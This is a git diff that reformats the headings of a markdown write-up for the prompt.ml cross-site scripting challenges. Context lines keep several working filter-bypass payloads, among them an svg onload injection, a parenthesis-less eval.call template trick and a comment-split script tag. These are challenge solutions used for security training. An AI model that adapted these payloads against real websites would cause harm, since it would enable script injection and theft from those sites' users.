@@ -1,13 +1,13 @@
 # prompt.ml
 
 ## Challenges
-1. Warmup
-2. Closing tag
-3. Parentheses
-7. Splits
-A. Encodings
+- [0](#0)
+- [1](#1)
+- [2](#2)
+- [7](#7)
+- [A](#a)
 
-### 0. Warmup
+## 0
 
 - Task
  
@@ -31,7 +31,7 @@ function escape(input) {
 <input type="text" value=""><svg onload=prompt(1)//">
 ```
 
-### 1. Tag stripping
+## 1
 
 - Task
 
@@ -58,7 +58,7 @@ function escape(input) {
 <article><svg onload=prompt(1)// </article>
 ```
 
-### 2. Parenthesis-less
+## 2
 
 - Task
 
@@ -84,9 +84,9 @@ HTML source
 <script>eval.call`${'prompt\x281\x29'}`</script>
 ```
 
-### 7. Splits
+## 7
 
-Task
+- Task
 
 ```
 function escape(input) {
@@ -99,7 +99,7 @@ function escape(input) {
 }
 ```
 
-Solution
+- Solution
 
 ```
 "><script>/*#*/prompt/*#*/(1)/*#*/</script>
@@ -114,7 +114,7 @@ Solution
 <p class="comment" title="*/</script>"></p>
 ```. Escape encoding
 
-### A. Encodings
+### A
 
 - Task
 
